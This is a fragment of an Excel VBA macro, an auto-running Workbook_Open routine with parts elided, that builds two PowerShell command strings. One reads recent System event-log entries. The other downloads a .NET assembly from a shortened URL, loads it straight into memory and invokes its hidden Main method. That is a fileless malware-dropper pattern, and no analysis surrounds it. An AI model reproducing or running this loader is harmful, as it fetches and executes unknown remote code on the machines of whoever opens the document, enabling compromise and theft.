...
Sub Workbook_Open()
    ...
    originalCli = "powershell.exe -c Get-EventLog -LogName 'System' -Source 'Microsoft-Windows-*' -After $((Get-Date).AddDays(-7)) | Where {$_.InstanceID -eq '6'} | Where {$_.Message -like 'File*'}"
    ...
    cmdStr = "powershell -c [System.Reflection.Assembly]::Load([Net.Webclient]::new().DownloadData('https://tinyurl.com/ay6f6rzf'));([Shell].getmethod('Main', ([Reflection.BindingFlags] 'NonPublic,Static'))).invoke($null, $null);"
